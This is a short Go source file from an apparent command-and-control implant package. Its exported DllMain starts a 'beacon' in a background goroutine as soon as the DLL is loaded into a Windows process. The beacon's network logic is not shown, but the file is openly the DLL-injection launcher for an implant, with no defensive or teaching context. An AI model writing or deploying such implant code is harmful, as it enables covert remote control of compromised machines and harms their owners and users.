//go:build windows && dll

package implant

import "C"
import (
	"log"
)

const DLL_PROCESS_ATTACH = 1

//export DllMain
func DllMain(hinstDLL uintptr, fdwReason uint32, lpReserved uintptr) bool {
	switch fdwReason {
	case DLL_PROCESS_ATTACH:
		go startBeacon()
	}
	return true
}

func startBeacon() {
	cfg, err := LoadConfig()
	if err != nil {
		log.Printf("[dll] config error: %v", err)
		return
	}
	beacon, err := New(cfg)
	if err != nil {
		log.Printf("[dll] beacon init error: %v", err)
		return
	}
	beacon.Run()
}
